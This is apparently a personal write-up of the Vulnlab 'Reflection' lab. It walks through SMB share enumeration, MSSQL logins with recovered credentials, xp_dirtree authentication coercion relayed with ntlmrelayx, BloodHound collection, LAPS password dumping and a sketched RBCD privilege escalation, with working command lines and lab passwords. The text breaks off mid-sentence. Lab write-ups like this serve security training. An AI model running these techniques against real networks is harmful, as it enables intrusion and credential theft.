---
title: Vulnlab - Reflection
date: 2022-08-04
categories: [Vulnlab]
tags: [Vulnlab, AD]
pin: false
---

## Vulnlab - Reflection
Reflection is another chain from Vulnlab which goes into MSSQL exploitation, relaying and Resource-based Constrained Delegation (RBCD) abuse.


## Targets
Upon starting the box I added the following information into my hosts file.
```
10.10.153.213 reflection.vl
10.10.153.213 dc01.reflection.vl
10.10.153.214 ms01.reflection.vl
10.10.153.215 ws01.reflection.vl
```

## Scan dc.reflection.vl
```
PORT     STATE    SERVICE       VERSION
53/tcp   open     domain        Simple DNS Plus
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-02 12:11:03Z)
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)
445/tcp  open     microsoft-ds?
464/tcp  open     kpasswd5?
593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open     tcpwrapped
1433/tcp open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)
3389/tcp open     ms-wbt-server Microsoft Terminal Services
5985/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
6039/tcp filtered x11
9389/tcp open     adws?
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```

## Scan ms01.reflection.vl
```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

## Scan ws01.reflection.vl
```

```

## SMB enumeration - MS01
After some SMB enumeration I figured out that the MS01 machine has an accessible share called 'staging'.
![_install](/assets/img/VL-Reflection/smbclient.png)
When accessing the share we can see that it contains a file called "staging_db.conf" which when viewed
contains a set of credentials for a database called "staging":
![_install](/assets/img/VL-Reflection/smbclient2.png)

## MSSQL enumeration - MS01
Using netexec I tried the credentials that I found on the  share. This revealed that we can use it on the MSSQL database on MS01.
![_install](/assets/img/VL-Reflection/nxc_mssql.png)
Let access mssql service using mssqlclient.py from impacket:
```bash
python3 mssqlclient.py ./'web_staging':'Washroom510'@10.10.220.54
```
This results in us getting acccess on the MSSQL server on MS01 as the local user web_staging:
![_install](/assets/img/VL-Reflection/mssqlclient1.png)

## MSSQL UNC Path Injection Relay - MS01
I tried some basic privilege escalation techniques such as enabling xp_cmdshell which ultimatly resultated in nothing. 
One thing I noticed during enumeration is that the DC doesn't have SMB Signing enabled. I found this very odd and thought 
we might have to relay some kind of authentication request. An attack that I've done quite a few time on client assessments is 
using UNC Path Injection using the xp_dirtree stored procedure and relay the authentication to other machines in the domain.

First let's check if we can coerce authentication using xp_dirtree to our attacker machine:
![_install](/assets/img/VL-Reflection/xp_dirtree.png)
We see that we successfully receieve an incoming connection on our SMB server from the Domain User svc_web_staging.
I also tried to crack the hash, however this didn't do well. Lets setup ntlmrelayx from impacket to relay to authentication:
```bash
ntlmrelayx.py -tf ips.txt -socks -smb2support -debug
```
I used the -tf and -socks option to relay the authentication to all computers and create a socks5 proxy which I can use my tools through.
After triggering the coercion we can see that we have an active connection to DC and WS01 


## Active Directory Enumeration
Now that we have an active Socks5 SMB connection to the DC and WS01 we can perform some AD enumeration. First let's see if we 
can find something of interest on the SMB shares using smbclient.py from the impacket toolkit:
```bash
proxychains smbclient.py REFLECTION/SVC_WEB_STAGING:'fakepass'@10.10.153.213
```
We can check if there are any shares which we can access. In this case we can access the "prod" share which contains a file called"prod_db.conf".
We already had staging credentials to the MSSQL database, now lets try to validate if we have access to another MSSQL database using netexec:
```bash
nxc mssql ips.txt -u web_prod -p Tribesman201 --local-auth
```
Netexec tells us that the credentials are valid on the DC, let's login again using mssqlclient.py from impacket:
```bash
python3 mssqlclient.py ./'web_prod':'Tribesman201'@10.10.153.213
```
And once again we have access to the prod database. After some quick enumeration I found the users table which contain two sets of credentials:
![_install](/assets/img/VL-Reflection/initial_ad_creds.png)

I put the credentials into two seperate files called "users.txt" and "pass.txt" and checked if the credentials are valid using netexec:

Now that we have valid AD credentials we can enumerate the AD environment. Lets start by kicking of the BloodHound.py remote ingestor:
```bash
python3 bloodhound.py -d reflection.vl -v --zip -c All -dc reflection.vl -ns 10.10.153.213 -u dorothy.rose -p 'hC_fny3OK9glSJ'
```
After running the script we can load the zip file into BloodHound and perform some enumeration. I quickly noticed that the user 
"abbie.smith" has GenericAll right on the MS01 machine which allows us to add the ms-DSAllowedToActOnBehalfOfOtherIdentity 
attribute. This allows us to perform an RBCD attack on the Domain thus allowing us to elevate privileges. Sadly I quickly realized
that his was not possible since the MachineAccountQuota was set to 0.
```bash
nxc ldap 10.10.153.213 -u abbie.smith -p 'CMe1x+nlRaaWEw' -M MAQ
```
![_install](/assets/img/VL-Reflection/maq.png)

Upon enumerating the MS01 machine I noticted that it has LAPS enabled. 
![_install](/assets/img/VL-Reflection/LAPS.png)
Since we have GenericAll permissions on the computer this allows us the retrieve the Local Admininistrator Password of the MS01 
computer. Using netexec I was able to dump the LAPS password of the computer:
```bash
nxc ldap 10.10.153.213 -u abbie.smith -p 'CMe1x+nlRaaWEw' -M laps
```
![_install](/assets/img/VL-Reflection/laps_dump.png)



## Resource Based Constrained Delegation

Dumped the password of Gerogia.price which has genericall on WS01. We get get hash of WS01 and perform RBCD. First run secretsdump.py
and add RBCD using rbcd.py from impacket.

Then impersonate the administrator on the domain while request a silver ticket using getST.py from again impacket for the CIFS 
service.

NExt we import the kerberos ticket in memory and secretsdump the WS01 computer. This reveals the password of Rhys.Garner, however
we don't need his password since we already have Domain Admin access. Let's try to 
